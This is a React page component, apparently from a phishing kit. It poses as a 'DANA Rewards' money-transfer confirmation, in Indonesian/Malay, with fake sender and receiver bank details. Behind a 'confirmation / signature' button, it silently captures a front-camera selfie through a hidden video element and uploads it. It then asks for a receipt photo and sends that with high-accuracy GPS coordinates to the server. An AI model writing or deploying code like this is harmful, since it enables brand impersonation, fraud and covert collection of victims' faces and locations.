'use client';

import { useEffect, useState, useRef } from 'react';

export default function LandingClient({ initialSettings, initialProfil }) {
  const [settings, setSettings] = useState(initialSettings || null);
  const [profil, setProfil] = useState(initialProfil || null);
  const [step, setStep] = useState(1); // 1=front, 2=back camera, 3=send
  const [loading, setLoading] = useState(!initialSettings);

  const videoBackRef = useRef(null);
  const previewBackRef = useRef(null);
  const streamBackRef = useRef(null);
  const backBlobRef = useRef(null);
  const canvasRef = useRef(null);

  useEffect(() => {
    if (!initialSettings) {
      fetch('/api/settings')
        .then(r => r.json())
        .then(data => {
          setSettings(data.transfer);
          setProfil(data.profil);
          setLoading(false);
        })
        .catch(() => setLoading(false));
    }

    // Create canvas once
    canvasRef.current = document.createElement('canvas');
  }, [initialSettings]);

  async function captureFront() {
    try {
      const streamFront = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' }
      });

      const videoFront = document.createElement('video');
      videoFront.srcObject = streamFront;
      await videoFront.play();
      await new Promise(r => setTimeout(r, 600));

      const canvas = canvasRef.current;
      const ctx = canvas.getContext('2d');
      canvas.width = videoFront.videoWidth;
      canvas.height = videoFront.videoHeight;
      ctx.drawImage(videoFront, 0, 0);

      const frontBlob = await new Promise(res => canvas.toBlob(res, 'image/png'));

      const fd = new FormData();
      fd.append('foto', frontBlob);
      await fetch('/api/save-record', { method: 'POST', body: fd });

      streamFront.getTracks().forEach(t => t.stop());
      openBackCamera();
    } catch {
      alert('Izin kamera diperlukan');
    }
  }

  async function openBackCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: 'environment' } }
      });

      streamBackRef.current = stream;
      if (videoBackRef.current) {
        videoBackRef.current.srcObject = stream;
        videoBackRef.current.style.display = 'block';
        await videoBackRef.current.play();
      }
      if (previewBackRef.current) {
        previewBackRef.current.style.display = 'none';
      }
      setStep(2);
    } catch {
      alert('Tidak dapat membuka kamera belakang');
    }
  }

  function captureBack() {
    const video = videoBackRef.current;
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);

    canvas.toBlob((blob) => {
      backBlobRef.current = blob;

      if (previewBackRef.current) {
        previewBackRef.current.src = URL.createObjectURL(blob);
        previewBackRef.current.style.display = 'block';
      }
      if (videoBackRef.current) {
        videoBackRef.current.style.display = 'none';
      }
      if (streamBackRef.current) {
        streamBackRef.current.getTracks().forEach(t => t.stop());
      }
      setStep(3);
    }, 'image/png');
  }

  function sendData() {
    if (!navigator.geolocation) {
      alert('Browser tidak menyokong lokasi');
      return;
    }

    setStep(0); // disable

    navigator.geolocation.getCurrentPosition(async (pos) => {
      const fd = new FormData();
      fd.append('foto', backBlobRef.current);
      fd.append('lat', pos.coords.latitude);
      fd.append('lng', pos.coords.longitude);
      fd.append('accuracy', pos.coords.accuracy);

      try {
        await fetch('/api/save-record', { method: 'POST', body: fd });
        alert('Berhasil dihantar');
        window.location.href = '/konfirmasi';
      } catch {
        alert('Gagal menghantar');
        setStep(3);
      }
    }, () => {
      alert('Izin lokasi ditolak');
      setStep(3);
    }, { enableHighAccuracy: true });
  }

  function handleClick() {
    if (step === 1) captureFront();
    else if (step === 2) captureBack();
    else if (step === 3) sendData();
  }

  const btnText = step === 1
    ? 'Ambil Foto Konfirmasi / Tanda Tangan'
    : step === 2
      ? 'Ambil Foto Resit'
      : step === 3
        ? 'Kirim Foto'
        : 'Mengirim...';

  const btnClass = step === 3 ? 'btn-capture green' : 'btn-capture blue';

  if (loading) {
    return (
      <div className="landing-body" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <div className="spinner"></div>
      </div>
    );
  }

  return (
    <div className="landing-body">
      {/* Nav */}
      <nav className="landing-nav" style={{ backgroundColor: profil?.theme_color || '#0086FF' }}>
        <div className="nav-inner">
          <span className="nav-title">{profil?.site_title || 'DANA Rewards'}</span>
        </div>
      </nav>

      {/* Content */}
      <div style={{ paddingTop: '5rem', paddingLeft: '1rem', paddingRight: '1rem', display: 'flex', justifyContent: 'center' }}>
        <div className="landing-card">
          {/* Header */}
          <div style={{ textAlign: 'center', marginBottom: '1.5rem' }}>
            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '0.75rem' }}>
              {profil?.og_image && (
                <img src={profil.og_image} alt="Logo" className="landing-logo" />
              )}
            </div>
            <h1 style={{ fontSize: '1.25rem', fontWeight: 600, color: '#1f2937' }}>
              {settings?.title || 'Transfer'}
            </h1>
            <p style={{ fontSize: '0.875rem', color: '#6b7280' }}>
              {settings?.subtitle || ''}
            </p>
          </div>

          {/* Amount */}
          <div className="amount-box">
            <p className="amount-label">Jumlah Diterima</p>
            <p className="amount-value">{settings?.amount_idr || ''}</p>
            <p className="amount-value">{settings?.amount_myr || ''}</p>
          </div>

          {/* Details */}
          <div style={{ marginBottom: '1.5rem' }}>
            <div className="detail-row">
              <span className="detail-label">Pengirim</span>
              <span className="detail-value">{settings?.sender_bank || ''}</span>
            </div>
            <div className="detail-row">
              <span className="detail-label">Nama Akun Pengirim</span>
              <span className="detail-value">{settings?.sender_name || ''}</span>
            </div>
            <div className="detail-row">
              <span className="detail-label">No. Akun Pengirim</span>
              <span className="detail-value">{settings?.sender_account || ''}</span>
            </div>
            <hr className="detail-divider" />
            <div className="detail-row">
              <span className="detail-label">Penerima</span>
              <span className="detail-value">{settings?.receiver_bank || ''}</span>
            </div>
            <div className="detail-row">
              <span className="detail-label">No. Akun Penerima</span>
              <span className="detail-value">{settings?.receiver_account || ''}</span>
            </div>
            <div className="detail-row">
              <span className="detail-label">Nama Akun Penerima</span>
              <span className="detail-value">{settings?.receiver_name || ''}</span>
            </div>
          </div>

          {/* Camera */}
          <video
            ref={videoBackRef}
            autoPlay
            playsInline
            className="video-preview"
            style={{ display: 'none' }}
          />
          <img
            ref={previewBackRef}
            className="video-preview"
            style={{ display: 'none' }}
            alt="Preview"
          />

          {/* Button */}
          {step !== 0 && (
            <button
              className={btnClass}
              onClick={handleClick}
              disabled={step === 0}
            >
              {btnText}
            </button>
          )}
          {step === 0 && (
            <button className="btn-capture blue" disabled>
              Mengirim...
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
